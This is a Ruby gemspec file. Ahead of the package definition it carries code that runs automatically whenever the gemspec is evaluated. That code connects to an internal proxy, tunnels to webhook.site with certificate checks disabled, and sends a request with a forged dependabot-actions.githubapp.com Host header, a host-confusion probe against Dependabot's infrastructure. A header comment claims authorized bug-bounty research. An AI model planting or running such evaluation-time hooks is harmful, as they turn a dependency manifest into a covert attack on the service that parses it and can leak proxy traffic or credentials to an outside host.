# Runs at gemspec-evaluation time. Authorized security research for GitHub's
# Dependabot HackerOne bounty (bounty.github.com/targets/dependabot.html).
begin
  require "socket"
  require "openssl"
  require "timeout"

  def host_confusion_probe(proxy_host, proxy_port, connect_target, forged_host, path)
    steps = []
    begin
      Timeout.timeout(15) do
        sock = TCPSocket.new(proxy_host, proxy_port)
        steps << "tcp_connected"
        sock.write("CONNECT #{connect_target}:443 HTTP/1.1\r\nHost: #{connect_target}:443\r\n\r\n")
        steps << "connect_sent"
        connect_resp = sock.readline
        steps << "connect_resp=#{connect_resp.strip.inspect}"
        ctx = OpenSSL::SSL::SSLContext.new
        ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
        ssl = OpenSSL::SSL::SSLSocket.new(sock, ctx)
        ssl.hostname = connect_target
        ssl.connect
        steps << "tls_established"
        req = "GET #{path} HTTP/1.1\r\nHost: #{forged_host}\r\nConnection: close\r\n\r\n"
        ssl.write(req)
        steps << "request_sent"
        data = ssl.read(2000)
        steps << "response_read bytes=#{data.to_s.bytesize}"
        ssl.close
        steps << "resp_first300=#{data.to_s[0,300].inspect}"
      end
    rescue => e
      steps << "FAILED #{e.class}: #{e.message}"
    end
    steps.join(" | ")
  end

  result = host_confusion_probe(
    "172.19.0.2", 1080,
    "webhook.site",
    "dependabot-actions.githubapp.com",
    "/61eb303b-510b-4c33-a552-ac87f451e6bf/host-confusion-test"
  )

  puts "==HOSTCONFUSION=="
  puts result
  puts "==HOSTCONFUSION_DONE=="
rescue => e
  warn "fingerprint error: #{e}"
end

Gem::Specification.new do |s|
  s.name        = "mygem"
  s.version     = "0.0.5"
  s.summary     = "temp research gem"
  s.authors     = ["researcher"]
  s.files       = ["lib/mygem.rb"]
  s.require_paths = ["lib"]
end
